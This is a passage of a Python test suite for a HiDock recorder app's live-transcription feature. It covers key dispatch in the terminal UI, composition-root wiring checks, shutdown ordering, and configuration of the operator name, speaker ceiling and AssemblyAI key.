    def recording_runner(argv, **kwargs):
        _bind_like_the_default_runner(argv, **kwargs)
        seen.append(kwargs)
        return subprocess.CompletedProcess(argv, 0)

    launch_app_window("http://127.0.0.1:9/?k=abc", runner=recording_runner)

    assert seen, "the runner seam was never used"
    bound = seen[0].get("timeout", _UNSET)
    assert bound is not _UNSET, (
        "the browser launch must be bounded; `l` runs on the keyboard thread"
    )
    assert bound == LAUNCH_TIMEOUT_SECONDS
    assert isinstance(bound, (int, float)) and not isinstance(bound, bool)
    assert 0 < bound <= 10, f"a {bound}s wait on the keyboard thread is not a bound"


# ==========================================================================
# U-18 — `l` reaches the controller through the real key handler
# ==========================================================================


class _RecordingController:
    """Faithful stand-in for `LiveSessionController` at the TUI seam.

    Phase 1e: `toggle` carries the per-session speaker ceiling, and the TUI reads
    `default_max_speakers` to prepopulate its prompt and `start_refusal()` to
    decide whether to open one at all. `committed` records the ceiling of every
    press, because "a session started" and "a session started with the
    operator's number" are different claims and only the second falsifies a
    clamp.
    """

    def __init__(self, *, default_max_speakers: int = 8, refusal=None):
        self.toggles = 0
        self.committed: List[Optional[int]] = []
        self.live = False
        self.default = default_max_speakers
        self.refusal = refusal

    @property
    def default_max_speakers(self) -> int:
        _bind_against(LiveSessionController.default_max_speakers.fget)
        return self.default

    def start_refusal(self) -> Optional[str]:
        _bind_against(LiveSessionController.start_refusal)
        return self.refusal

    def toggle(self, max_speakers: Optional[int] = None) -> None:
        _bind_against(LiveSessionController.toggle, max_speakers=max_speakers)
        self.toggles += 1
        self.committed.append(max_speakers)
        self.live = not self.live

    def stop(self, reason: str = "stopped") -> None:
        _bind_against(LiveSessionController.stop, reason=reason)
        self.live = False

    @property
    def is_live(self) -> bool:
        return self.live


class _NoopKeyboard:
    def start(self): pass
    def stop(self): pass


def _tui(controller_double=None, state: str = "CONNECTED_IDLE") -> TUI:
    tui = TUI(
        bus=EventBus(),
        live_controller=controller_double,
        keyboard=_NoopKeyboard(),
    )
    tui._state = state
    return tui


def test_pressing_l_reaches_the_live_session_controller():
    """U-18. Dispatched through the REAL `_on_key`, not by calling `toggle()`: the
    binding is the part that can be missing, and calling the method directly is
    what let the retry surface look tested while `r` did nothing.

    TRANSFORMED for phase 1e (live_speaker_count_prompt_prd.md FR-1.1). The
    assertion that `l` reaches the controller is kept in full; what changed is
    that it reaches it on CONFIRMATION rather than on the keystroke, because `l`
    now opens the speaker-count prompt and starts nothing until Enter. The old
    single-keystroke form would now pass against an implementation that ignored
    the prompt entirely, which is why it could not simply be left as it was."""
    # MUTATION: bind `L` instead of `l`, or omit the branch entirely (the key then
    # logs "no binding at top level" and the feature is unreachable).
    double = _RecordingController()
    tui = _tui(double)

    tui._on_key("l")
    tui._on_key("\r")

    assert double.toggles == 1
    joined = " ".join(message for _when, message, _sev in tui._log)
    assert "no binding at top level" not in joined


def test_pressing_l_twice_toggles_the_session_off_again():
    """FR-5.2 — one key, both directions, through the dispatcher.

    TRANSFORMED for phase 1e: the START half is now `l` then Enter, and the STOP
    half stays a bare `l` (FR-1.1 puts a prompt in front of starting a metered
    session; there is nothing to ask before ending one)."""
    # MUTATION: guard the branch with `if not controller.is_live`, making `l` a
    # start-only key and leaving a metered session with no stop.
    double = _RecordingController()
    tui = _tui(double)

    tui._on_key("l")
    tui._on_key("\r")
    tui._on_key("l")

    assert double.toggles == 2
    assert double.is_live is False


def test_l_is_dispatched_ahead_of_the_connected_idle_gate():
    """FR-6.2 owns the refusal, and it names the in-progress offload. Routing `l`
    after `keys_active_in_state` would answer 'keys active only in CONNECTED_IDLE'
    — the exact dispatch-ordering defect already fixed once for `r`."""
    # MUTATION: move the `l` branch below the `keys_active_in_state` early return.
    double = _RecordingController()
    tui = _tui(double, state="DRAINING")

    tui._on_key("l")

    assert tui._speaker_prompt is not None, "the state gate swallowed `l`"
    tui._on_key("\r")
    assert double.toggles == 1, "the state gate swallowed `l`"
    joined = " ".join(message for _when, message, _sev in tui._log)
    assert "keys active only in CONNECTED_IDLE" not in joined


def test_l_without_a_controller_says_so_instead_of_crashing():
    """A build with no controller wired is the `ad98cbc` shape. If it ever happens
    again the operator must see it, not press a dead key — the keyboard reader
    swallows exceptions, so a crash here is indistinguishable from a no-op.

    `"l" in joined.lower()` is not an assertion about anything: the fall-through
    branch logs "key 'l' received but has no binding at top level", which contains
    an `l`, so DELETING the `l` binding outright — the exact `ad98cbc` shape this
    test is named for — leaves it green. The message has to be shown to be the one
    that names the missing controller, and NOT the unmapped-key line.
    """
    # MUTATION: delete the `if ch == "l":` branch from `TUI._on_key`. The key then
    # falls through to the unmapped-key branch, live transcription is unreachable,
    # and the log says so in a line that still contains the letter `l`.
    tui = _tui(None)

    tui._on_key("l")  # must not raise

    logged = list(tui._log)
    assert logged, "the keystroke was not acknowledged at all"
    _when, message, severity = logged[-1]
    lowered = message.lower()
    assert "no binding at top level" not in lowered, (
        f"`l` reached the unmapped-key branch, so the binding is gone: {message}"
    )
    assert "'l'" in message, f"the message does not name the key: {message}"
    assert "live" in lowered, f"the message does not name the feature: {message}"
    assert "controller" in lowered or "wired" in lowered, (
        f"the message does not name the missing wiring: {message}"
    )
    assert severity is Severity.WARNING, (
        "a build with no live controller is a defect, not an INFO note"
    )


def test_l_does_not_disturb_the_modal_key_sets():
    """`l` is free at top level, but the whisper modal owns `j`/`k`/`a`/`q`/space
    and the unknown prompt owns `m`/`w`/`s`. A top-level binding that fires while a
    modal is open starts a metered session from a keystroke aimed elsewhere."""
    # MUTATION: dispatch `l` before the modal routing at the top of `_on_key`.
    from hidock_direct.tui_handlers import WhisperSelectionState

    double = _RecordingController()
    tui = _tui(double)
    tui._whisper_modal = WhisperSelectionState(filenames=["a.hda"])

    tui._on_key("l")

    assert double.toggles == 0
    assert tui._speaker_prompt is None, "a prompt opened from a keystroke aimed elsewhere"
    assert tui._whisper_modal is not None


def test_the_tui_accepts_the_live_controller_as_a_keyword_seam():
    """The seam has to exist with the name the composition root passes, or the
    structural sweep in `test_main_wiring.py` cannot see it."""
    # MUTATION: rename the parameter (e.g. `live_session_controller=`), which the
    # PRD's own §7 sketch uses — the sweep then reports it unsupplied.
    parameters = inspect.signature(TUI.__init__).parameters
    assert "live_controller" in parameters
    assert parameters["live_controller"].kind is inspect.Parameter.KEYWORD_ONLY
    assert parameters["live_controller"].default is None


# ==========================================================================
# U-19 — the composition root, asserted against the real __main__
# ==========================================================================


def _main_call_kwargs(constructor: str) -> Dict[str, str]:
    """The kwargs `__main__` passes when it constructs `constructor`, as source
    text — so the test reads what production actually wires, not what a fixture
    hands in."""
    tree = ast.parse((SRC / "__main__.py").read_text())
    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and getattr(node.func, "id", None) == constructor:
            return {kw.arg: ast.unparse(kw.value) for kw in node.keywords if kw.arg}
    raise AssertionError(f"__main__.py never constructs a {constructor}")


def _controller_call_kwargs() -> Dict[str, str]:
    return _main_call_kwargs("LiveSessionController")


def test_the_composition_root_wires_every_seam_to_the_real_collaborator():
    """U-19 / FR-5.1. `ad98cbc` shipped the retry surface fully tested and
    completely unreachable because every test injected the provider `__main__`
    omitted. Reading the real call site is the only assertion that could have
    caught it."""
    # MUTATION: `api_key=config.assemblyai_api_key` -> `api_key=""`, or
    # `busy_predicate=lambda: False`, or `archive_dir=config.archive_dir` ->
    # `archive_dir=None`. Every behavioural test still passes.
    passed = _controller_call_kwargs()

    assert passed.get("bus") == "bus"
    assert passed.get("adapter") == "adapter"
    assert passed.get("api_key") == "config.assemblyai_api_key"
    assert passed.get("operator_name") == "config.operator_name"
    assert passed.get("max_speakers") == "config.live_max_speakers"
    assert passed.get("suspend_polling") == "app.suspend_device_polling"
    assert passed.get("resume_polling") == "app.resume_device_polling"
    assert "app.device_busy" in (passed.get("busy_predicate") or "")
    # The VALUE, not merely the presence of the keyword. `archive_dir=None` is a
    # real, accepted configuration — it is the pre-1d composition, and the
    # controller answers it by archiving nothing at all and saying nothing about
    # it. So an `archive_dir=None` here restores the phase-1a..1c DATA-LOSS
    # defect that phase 1d exists to close, and it does so while satisfying every
    # seam-presence sweep below. The recording is the only copy of a live call
    # that will ever exist; where it goes is not a detail this sweep may skip.
    assert passed.get("archive_dir") == "config.archive_dir", (
        f"__main__ passes archive_dir={passed.get('archive_dir')!r}; a live "
        "session's recording is the only copy of the call that will ever exist "
        "and it must go to the operator's configured archive"
    )


def test_every_live_controller_seam_is_supplied_by_the_composition_root():
    """The sweep, not the instance. A seam the controller accepts but the entry
    point never passes falls back to a default only the tests ever supply — which
    is the failure this whole file is shaped around."""
    # MUTATION: add a new `foo_factory=None` seam to LiveSessionController and
    # leave `__main__` untouched.
    injectable = [
        name
        for name, parameter in inspect.signature(LiveSessionController.__init__).parameters.items()
        if parameter.default is None
    ]
    assert injectable, "no injectable seams found — has the constructor changed?"

    passed = _controller_call_kwargs()
    missing = [name for name in injectable if name not in passed]

    assert not missing, (
        f"LiveSessionController accepts {missing} but __main__ never passes them; "
        f"they fall back to defaults that only the test suite exercises"
    )


def test_the_supplied_factories_resolve_to_the_real_production_types():
    """Supplied-but-inert is the same bug wearing a kwarg. Each factory must name
    the real collaborator, not a stub that keeps the sweep above green."""
    # MUTATION: `surface_factory=lambda **kw: None` in __main__ — present in the
    # call, so the sweep passes, and the feature is still dead. Or
    # `archive_factory=lambda archive_dir, **kw: None`, which loses every live
    # recording while every seam-presence assertion above stays green.
    passed = _controller_call_kwargs()

    assert "LiveSurface" in passed["surface_factory"]
    assert "RealtimeSession" in passed["capture_factory"]
    assert "LiveTranscriber" in passed["transcriber_factory"]
    assert "launch_app_window" in passed["launch_browser"]
    # `archive_factory` was omitted from this list while the list's own docstring
    # named "supplied-but-inert is the same bug wearing a kwarg" — and it is the
    # one seam whose inertness costs an artifact rather than a screen.
    assert "LiveArchive" in passed["archive_factory"]


def test_the_factory_kwargs_name_something_the_entry_point_actually_imported():
    """A factory named in the call has to resolve, at runtime, to the real class.

    The source-text sweep above reads `archive_factory=LiveArchive` and is
    satisfied — by a local `LiveArchive = object` just as happily as by the
    import. Binding the names against the module the entry point really built is
    what tells a wiring from a spelling.
    """
    # MUTATION: `from .live_server import LiveArchive` (a re-export that is not
    # the recorder), or shadow any of these four names in `__main__`.
    from hidock_direct import __main__ as main_mod
    from hidock_direct.live_archive import LiveArchive as RealArchive
    from hidock_direct.live_server import LiveSurface as RealSurface
    from hidock_direct.live_transcribe import LiveTranscriber as RealTranscriber
    from hidock_direct.realtime import RealtimeSession as RealCapture

    passed = _controller_call_kwargs()
    for keyword, expected in (
        ("archive_factory", RealArchive),
        ("surface_factory", RealSurface),
        ("capture_factory", RealCapture),
        ("transcriber_factory", RealTranscriber),
    ):
        resolved = getattr(main_mod, passed[keyword], None)
        assert resolved is expected, (
            f"__main__.{passed[keyword]} is {resolved!r}, not {expected!r}; the "
            f"{keyword} names something other than the real collaborator"
        )


def test_the_offloader_is_wired_to_the_live_session_log_on_the_same_bus():
    """`live_archive_prd.md` FR-3.1..FR-3.3. A live call is transcribed AND BILLED
    as it happens; if the device ever also keeps its own recording of it, the
    offload path would send the same conversation to AssemblyAI a second time.

    The whole suppression turns on one seam. A `LiveSessionLog` that `__main__`
    never passes leaves `Offloader._live_sessions` at `None`, which suppresses
    nothing forever — and the only evidence would be the bill. A log built
    against a DIFFERENT bus than the one the bridge publishes its start/stop on
    is the same defect with a plausible-looking call site.
    """
    # MUTATION: drop `live_sessions=live_sessions` from the `Offloader(...)` call,
    # or build the log as `LiveSessionLog(EventBus())`. Every offload test still
    # passes; every live call is billed twice the day the firmware starts keeping
    # its own file.
    from hidock_direct import __main__ as main_mod
    from hidock_direct.offload import LiveSessionLog

    passed = _main_call_kwargs("Offloader")
    assert passed.get("live_sessions") == "live_sessions", (
        f"__main__ passes live_sessions={passed.get('live_sessions')!r}"
    )
    assert passed.get("bus") == "bus"

    tree = ast.parse((SRC / "__main__.py").read_text())
    built = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Assign)
        and isinstance(node.value, ast.Call)
        and getattr(node.value.func, "id", None) == "LiveSessionLog"
    ]
    assert len(built) == 1, "__main__ does not build exactly one LiveSessionLog"
    assert [t.id for t in built[0].targets] == ["live_sessions"]
    assert [ast.unparse(a) for a in built[0].value.args] == ["bus"], (
        "the live-session log listens on a different bus than the offloader "
        "publishes on, so it observes no live sessions at all"
    )
    assert main_mod.LiveSessionLog is LiveSessionLog


def test_main_builds_a_controller_and_hands_it_to_the_tui(tmp_path, monkeypatch):
    """The behavioural half of U-19: run the real `main()` against fakes and take
    the object the TUI was actually given. The busy refusal is the proof the
    predicate reaches the App instance `main()` built — a wiring test that only
    read source could not tell a live seam from a plausible-looking one."""
    # MUTATION: construct the controller in `main()` but forget
    # `live_controller=live` on the TUI call (exactly `ad98cbc`'s shape).
    # MUTATION: add a keyword to `main()`'s `TUI(...)` or `App(...)` call that the
    # real class does not accept (`TUI(..., refresh_rate=4.0)`, `App(...,
    # poll_seconds=10)`). The doubles below bind against the real signatures, so
    # the `TypeError` that would otherwise first appear when a human ran
    # `python -m hidock_direct` is a red test instead of a dead entry point.
    from hidock_direct import __main__ as main_mod

    captured: Dict[str, object] = {}

    class _FakeTUI:
        # Binds against the REAL `TUI.__init__`, like every other double in this
        # file. These two are the LARGEST constructors the entry point calls, so
        # a `**kwargs`-permissive stand-in here is the most expensive kind: it
        # lets `main()` pass a keyword the real class does not accept, keeps the
        # whole suite green, and `python -m hidock_direct` then dies with a
        # `TypeError` before the TUI has rendered a single frame.
        def __init__(self, **kwargs):
            _bind_against(TUI.__init__, **kwargs)
            captured["tui_kwargs"] = kwargs

        def start(self) -> None:
            _bind_against(TUI.start)

        def stop(self) -> None:
            _bind_against(TUI.stop)

    class _BusyApp:
        def __init__(self, **kwargs):
            _bind_against(App.__init__, **kwargs)
            captured["app"] = self
            self.suspended = 0
            self.resumed = 0

        def run(self) -> None:
            _bind_against(App.run)

        def stop(self) -> None:
            _bind_against(App.stop)

        def suspend_device_polling(self, timeout: float = 5.0) -> bool:
            _bind_against(App.suspend_device_polling, timeout=timeout)
            self.suspended += 1
            return True

        def resume_device_polling(self) -> None:
            _bind_against(App.resume_device_polling)
            self.resumed += 1

        @property
        def device_busy(self) -> bool:
            return True

    monkeypatch.setattr(main_mod, "TUI", _FakeTUI)
    monkeypatch.setattr(main_mod, "App", _BusyApp)
    monkeypatch.setattr(main_mod, "JensenDeviceAdapter", lambda *a, **k: _FakeAdapter())
    monkeypatch.setattr(main_mod, "PollingUSBWatcher", lambda *a, **k: _SilentWatcher())
    monkeypatch.setattr(main_mod, "load_env_file_into_environ", lambda: None)
    monkeypatch.setattr(main_mod.signal, "signal", lambda *a, **k: None)
    monkeypatch.setattr(
        main_mod,
        "load_config",
        lambda: Config(
            archive_dir=tmp_path / "archive",
            poll_interval_seconds=10,
            delete_from_device_after_offload=False,
            transcribe_on_offload=False,
            log_level="info",
            source="test",
            operator_name="Dana",
            live_keep_wav_dir=None,
            live_max_speakers=4,
            assemblyai_api_key="k-from-config",
        ),
    )

    assert main_mod.main([]) == 0

    wired = captured["tui_kwargs"].get("live_controller")
    assert isinstance(wired, LiveSessionController), (
        f"the TUI was handed {wired!r} instead of a LiveSessionController"
    )
    with pytest.raises(LiveSessionError):
        wired.start()
    assert wired.is_live is False
    assert captured["app"].suspended == 0


# ==========================================================================
# Shutdown ordering — the live session gives up the device BEFORE the
# adapter drops the handle it streams over (FR-1.6 / FR-6.3)
# ==========================================================================


class _RecordingAdapter(_FakeAdapter):
    """`_FakeAdapter` that notes the moment the Jensen handle is dropped."""

    def __init__(self, order: List[str]):
        super().__init__()
        self._order = order

    def disconnect(self) -> None:
        self._order.append("adapter.disconnect")
        super().disconnect()


def _main_capturing_the_signal_handler(tmp_path, monkeypatch, order: List[str]):
    """Run the REAL `main()` against fakes and hand back the SIGINT handler it
    installed, plus the `LiveSessionController` that handler closed over.

    The fake `App` disconnects the adapter from `stop()` because the real one
    does (`app.py` `stop()` -> `self._adapter.disconnect()`). That disconnect is
    precisely the event the live teardown has to outrun, so a fake whose `stop()`
    did nothing would make the ordering unobservable and the test vacuous.
    """
    from hidock_direct import __main__ as main_mod

    captured: Dict[str, object] = {}
    handlers: Dict[int, object] = {}
    adapter = _RecordingAdapter(order)

    class _FakeTUI:
        # Binds against the real `TUI.__init__` for the same reason the U-19
        # double does: this is one of the two constructors the entry point
        # builds, and a permissive stand-in cannot fail on the disagreement that
        # would kill `python -m hidock_direct` at startup.
        def __init__(self, **kwargs):
            _bind_against(TUI.__init__, **kwargs)
            captured["tui_kwargs"] = kwargs

        def start(self) -> None:
            _bind_against(TUI.start)

        def stop(self) -> None:
            _bind_against(TUI.stop)

    class _QuietApp:
        def __init__(self, **kwargs):
            _bind_against(App.__init__, **kwargs)
            captured["app"] = self
            self._adapter = kwargs["adapter"]

        def run(self) -> None:
            _bind_against(App.run)

        def stop(self) -> None:
            _bind_against(App.stop)
            order.append("app.stop")
            self._adapter.disconnect()

        def suspend_device_polling(self, timeout: float = 5.0) -> bool:
            _bind_against(App.suspend_device_polling, timeout=timeout)
            return True

        def resume_device_polling(self) -> None:
            _bind_against(App.resume_device_polling)

        @property
        def device_busy(self) -> bool:
            return False

    monkeypatch.setattr(main_mod, "TUI", _FakeTUI)
    monkeypatch.setattr(main_mod, "App", _QuietApp)
    monkeypatch.setattr(main_mod, "JensenDeviceAdapter", lambda *a, **k: adapter)
    monkeypatch.setattr(main_mod, "PollingUSBWatcher", lambda *a, **k: _SilentWatcher())
    monkeypatch.setattr(main_mod, "load_env_file_into_environ", lambda: None)
    monkeypatch.setattr(
        main_mod.signal,
        "signal",
        lambda signum, handler: handlers.__setitem__(signum, handler),
    )
    monkeypatch.setattr(
        main_mod,
        "load_config",
        lambda: Config(
            archive_dir=tmp_path / "archive",
            poll_interval_seconds=10,
            delete_from_device_after_offload=False,
            transcribe_on_offload=False,
            log_level="info",
            source="test",
            operator_name="Dana",
            live_keep_wav_dir=None,
            live_max_speakers=4,
            assemblyai_api_key="k-from-config",
        ),
    )

    assert main_mod.main([]) == 0
    assert signal.SIGINT in handlers, "main() installed no SIGINT handler"
    # Nothing may have been torn down yet: the order asserted by the callers has
    # to be produced by the HANDLER, not by `main()`'s ordinary exit path.
    assert order == [], f"main() tore down the device before the signal: {order}"
    return handlers[signal.SIGINT], captured["tui_kwargs"]["live_controller"]


def test_shutdown_stops_the_live_session_before_the_adapter_disconnects(tmp_path, monkeypatch):
    """FR-1.6 / FR-6.3. `App.stop()` drops `_jensen`; once it has, the realtime
    STOP opcode (CMD 34) has no transport, and the HiDock stays in streaming mode
    until it is power-cycled. So the handler stops the live session first, while
    the claim it streams over is still open.

    The assertion is on ORDER, not on the fact of the call. The pre-fix handler
    also called `live.stop()` — just after the adapter was already gone — so a
    test that only checked `live.stop` was reached passes against the bug.
    """
    # MUTATION: reverse the handler's two steps, i.e. `app.stop()` before
    # `live.stop(...)` — exactly the order that shipped untested.
    order: List[str] = []
    handler, controller = _main_capturing_the_signal_handler(tmp_path, monkeypatch, order)

    real_stop = controller.stop

    def _recording_stop(**kwargs):
        _bind_against(LiveSessionController.stop, **kwargs)
        order.append("live.stop")
        return real_stop(**kwargs)

    monkeypatch.setattr(controller, "stop", _recording_stop)

    handler(signal.SIGINT, None)

    assert "live.stop" in order, f"the handler never stopped the live session: {order}"
    assert "adapter.disconnect" in order, f"the handler never stopped the app: {order}"
    assert order.index("live.stop") < order.index("adapter.disconnect"), (
        f"the Jensen handle was dropped before the live session released it: {order}"
    )


def test_the_shutdown_handler_tears_down_once_however_many_signals_arrive(tmp_path, monkeypatch):
    """Signals are delivered on the main thread, so a second ^C arriving while
    the handler is still unwinding re-enters it at the top. Without the latch the
    second pass re-drives a device teardown the first pass is still inside.
    """
    # MUTATION: delete the `if shutting_down: return` latch from `_shutdown`.
    order: List[str] = []
    handler, controller = _main_capturing_the_signal_handler(tmp_path, monkeypatch, order)
    monkeypatch.setattr(controller, "stop", lambda **kw: order.append("live.stop"))

    handler(signal.SIGINT, None)
    handler(signal.SIGINT, None)

    assert order.count("live.stop") == 1, f"the live session was torn down twice: {order}"
    assert order.count("app.stop") == 1, f"the app was torn down twice: {order}"


# ==========================================================================
# Configuration — the three fields the wiring reads
# ==========================================================================


def _config(tmp_path, monkeypatch, **env) -> Config:
    """`load_config` against an env file that does not exist, so the clone-local
    `.env` (which holds a live AssemblyAI key) is never read by the suite."""
    for name in ("HIDOCK_OPERATOR_NAME", "HIDOCK_LIVE_MAX_SPEAKERS", "ASSEMBLYAI_API_KEY"):
        monkeypatch.delenv(name, raising=False)
    for name, value in env.items():
        monkeypatch.setenv(name, value)
    return load_config(env_file=tmp_path / "absent.env")


def test_the_operator_name_comes_from_the_environment(tmp_path, monkeypatch):
    """FR-4.1. `HIDOCK_OPERATOR_NAME` is the whole configuration surface for the
    near channel's identity."""
    # MUTATION: read a differently-spelled variable (`OPERATOR_NAME`), which leaves
    # every operator on the default forever.
    config = _config(tmp_path, monkeypatch, HIDOCK_OPERATOR_NAME="Dana Whitfield")

    assert config.operator_name == "Dana Whitfield"


def test_the_operator_name_defaults_to_me_when_unset(tmp_path, monkeypatch):
    """FR-4.2. Neutral, true for every user, and never the maintainer's name."""
    # MUTATION: `_resolve("HIDOCK_OPERATOR_NAME", "Blake", ...)`.
    assert _config(tmp_path, monkeypatch).operator_name == "Me"


def test_the_live_speaker_ceiling_is_configurable(tmp_path, monkeypatch):
    """TRANSFORMED for phase 1e (live_speaker_count_prompt_prd.md FR-2.4).

    This test asserted a DEFAULT of six. That default is now 8, and it is no
    longer a fixed ceiling at all — it is the value the `l` prompt is
    prepopulated with, which the operator commits with Enter or overrides per
    call. Six was live on the 10-person call that collapsed two or three people
    into one label.

    The default assertion is not dropped: it MOVED to
    `test_config.py::test_the_prepopulated_speaker_default_is_eight`, which is
    where the §5 U-12 obligation lives and where the vendor range it now has to
    satisfy is pinned alongside it. What stays here is the part this file is
    about — that the live surface's ceiling is configurable and typed."""
    # MUTATION: `int(...)` dropped, so the ceiling reaches the SDK as a string and
    # the far session's diarization request is malformed.
    config = _config(tmp_path, monkeypatch, HIDOCK_LIVE_MAX_SPEAKERS="3")

    assert config.live_max_speakers == 3
    assert isinstance(config.live_max_speakers, int)


def test_a_non_numeric_speaker_ceiling_fails_loudly_at_startup(tmp_path, monkeypatch):
    """Consistent with `POLL_INTERVAL_SECONDS`: a config error must be a startup
    failure naming the variable, not a `TypeError` from inside a paid session."""
    # MUTATION: `int(value) if value.isdigit() else 6` — a typo then silently
    # becomes the default and the operator never learns their setting was ignored.
    with pytest.raises(ValueError) as excinfo:
        _config(tmp_path, monkeypatch, HIDOCK_LIVE_MAX_SPEAKERS="six")

    assert "HIDOCK_LIVE_MAX_SPEAKERS" in str(excinfo.value)


def test_the_assemblyai_key_is_carried_on_the_config(tmp_path, monkeypatch):
    """PRD §7 assumed a field that did not exist: the key reached code only through
    `os.environ`. The live wiring needs it as a value it can pass, because reading
    a process global at use time is the shape that produced the INBOX_DIRS bug."""
    # MUTATION: `assemblyai_api_key: str = ""` never populated from os.environ.
    config = _config(tmp_path, monkeypatch, ASSEMBLYAI_API_KEY="k-from-environment")

    assert config.assemblyai_api_key == "k-from-environment"


def test_a_missing_assemblyai_key_is_empty_rather_than_a_startup_failure(
    tmp_path, monkeypatch
):
    """The offload half of the app works without a key (`TRANSCRIBE_ON_OFFLOAD` can
    be false), so a missing key must not stop the app from launching — the bridge
    already names it as operator-actionable when a session is actually started."""
    # MUTATION: `raise ValueError("ASSEMBLYAI_API_KEY is required")` in load_config,
    # which breaks the offload-only install.
    assert _config(tmp_path, monkeypatch).assemblyai_api_key == ""


def test_the_key_is_never_printed_by_the_config_repr(tmp_path, monkeypatch):
    """NFR-4's spirit at the config layer. A recon command printed the live key
    into a session transcript on 2026-08-22; a dataclass repr is the next such
    surface, and `Config` is logged in diagnostics."""
    # MUTATION: leave `assemblyai_api_key` as an ordinary dataclass field with
    # `repr=True` (the default).
    config = _config(tmp_path, monkeypatch, ASSEMBLYAI_API_KEY="k-super-secret-value")

    assert "k-super-secret-value" not in repr(config)


# ==========================================================================
# NFR-1 / NFR-2 / §6.4 — structural guards on the module itself
# ==========================================================================


def test_the_module_lives_outside_the_vendored_trees():
    """NFR-1. `jensen/` and `diarize_audio/` are overwritten wholesale by their
    refresh scripts, so anything placed there is deleted by a routine re-vendor."""
    # MUTATION: implement the surface inside `src/hidock_direct/jensen/`.
    import hidock_direct.live_server as module

    path = pathlib.Path(module.__file__)
    assert path.parent == SRC, f"live_server lives at {path}"
    assert "jensen" not in path.parts and "diarize_audio" not in path.parts


def test_the_module_adds_no_dependency():
    """NFR-2. This is a public clone-and-run app; a new import means every existing
    user's `pip install` changes for a feature they may never press."""
    # MUTATION: `import websockets` / `import flask` for the server.
    import hidock_direct.live_server as module

    tree = ast.parse(inspect.getsource(module))
    imported: List[str] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.extend(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
            imported.append(node.module.split(".")[0])

    allowed = set(sys.stdlib_module_names) | {"hidock_direct"}
    foreign = sorted(set(imported) - allowed)
    assert foreign == [], f"live_server imports non-stdlib packages: {foreign}"


def test_the_module_never_reaches_the_ledger_the_archive_or_the_filesystem():
    """NFR-6. Structural rather than grepped: the module docstring is expected to
    NAME the archive in order to explain why it must never write it, and a text
    scan that forced the deletion of its own rationale would be the wrong test."""
    # MUTATION: `open(cache_path, "w")` to persist the ring, or importing `state`
    # to mark a live session in the ledger (which gates the OFFLOAD and would lose
    # the recording outright).
    import hidock_direct.live_server as module

    tree = ast.parse(inspect.getsource(module))

    imported: List[str] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.extend(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.append(node.module)
    for banned in ("state", "offload", "pipeline", "transcribe", "pathlib", "shutil"):
        assert banned not in imported, f"live_server must not import {banned}"

    called = {
        node.func.id
        for node in ast.walk(tree)
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
    }
    for banned in ("open", "Path"):
        assert banned not in called, f"live_server must not call {banned}()"


def test_the_page_is_a_module_level_template_not_a_file_read():
    """NFR-1 names the page as a module-level template. A sibling `.html` read at
    request time breaks a wheel install and reintroduces the filesystem NFR-6
    forbids."""
    # MUTATION: `PAGE = (Path(__file__).parent / "live.html").read_text()`.
    import hidock_direct.live_server as module

    templates = [
        value
        for name, value in vars(module).items()
        if isinstance(value, str) and "<" in value and "EventSource" in value
    ]
    assert templates, "no module-level HTML template found"


def test_no_existing_test_still_pins_polling_as_unconditional():
    """§6.4 authorises exactly one migration in writing: a test asserting 'polling
    always runs while connected' becomes 'polling runs while connected AND no live
    session holds the device'. The PRD requires the implementer to GREP for it
    rather than assume its absence, so the grep is the test."""
    # MUTATION: land FR-6.1 while leaving a suspended-polling case unasserted in
    # the count-delta suite — this fails until that file names the new condition.
    counted = (pathlib.Path(__file__).parent / "test_count_delta_scan.py").read_text()

    assert "suspend" in counted.lower(), (
        "test_count_delta_scan.py pins the poll loop but says nothing about "
        "suspension; migrate it per PRD §6.4 (migrate-fixture, authorised in writing)"
    )


def test_detach_mid_session_ends_the_session_with_a_stated_reason(controller):
    """FR-6.4 / §3.8 'terminal-expected'. The stream stops and the transcript stays
    readable — a detached device is not a crash, and clearing the window would
    destroy the only copy of a live session.

    This test INJECTS its failure text, so it pins the terminal state and the
    fact that a reason was stated — and nothing about what the reason SAYS. The
    string below is not one `realtime` produces on an unplug, and it does not
    match `_DEVICE_GONE_MARKERS`, so it passes through `_translate_live_failure`
    untouched: "device" is in the assertion only because it was in the input.
    `test_an_unplug_is_reported_to_the_operator_in_their_own_language` drives the
    real module and is where the message itself is pinned.
    """
    # MUTATION: treat DeviceDetached like any other terminal failure and tear the
    # surface down immediately, or leave the session `is_live` with a dead device.
    harness = controller()
    harness.controller.start()
    harness.capture.raise_after = RealtimeUnavailable("device stopped responding")
    harness.capture.released.set()

    _wait_until(lambda: not harness.controller.is_live, msg="session stayed live")

    assert harness.resumes == 1
    assert "device" in harness.messages().lower()
    # `isinstance(event, (LiveTranscriptionStopped, Error))` alone is satisfied
    # UNCONDITIONALLY by the start path: `start()` publishes "Live transcription
    # is running — <url>" and "Live window: ..." as INFO `Error`s before any
    # detach can happen, so the filter matches two events in every run and the
    # assertion holds even when the pump tells the surface nothing at all. The
    # termination notice is what has to be found, so it is what is looked for.
    endings = [
        event for event in harness.surface.published
        if isinstance(event, LiveTranscriptionStopped)
        or (isinstance(event, Error) and "transcription stopped" in event.message.lower())
    ]
    assert endings, (
        "the surface was never told why the stream ended; the page keeps a lit "
        "LIVE indicator over a dead device"
    )
    ending = endings[-1]
    assert "device" in getattr(ending, "message", "").lower()
    assert getattr(ending, "severity", Severity.ERROR) is Severity.ERROR


class _UnpluggedAdapter(_FakeAdapter):
    """A `JensenDeviceAdapter` after the cable came out.

    `JensenDeviceAdapter.disconnect()` sets `_jensen = None`, and that — not a
    missing attribute — is what an unplug leaves behind for `realtime` to find.
    `is_connected()` is deliberately still True: the two facts are tracked
    separately in production and the transport is the one that goes first.
    """

    _jensen = None


@pytest.mark.parametrize(
    "description,build_adapter,raw_marker",
    [
        # `realtime._jensen()` — the transport object is gone. This is what an
        # unplug DURING a call looks like from inside the module.
        ("the transport is gone", _UnpluggedAdapter,
         "adapter exposes no Jensen transport"),
        # `RealtimeSession.start()` — the same fact noticed one layer up, on the
        # session that begins right after the cable came out.
        ("the adapter reports no device", lambda: _FakeAdapter(connected=False),
         "device is not connected"),
    ],
)
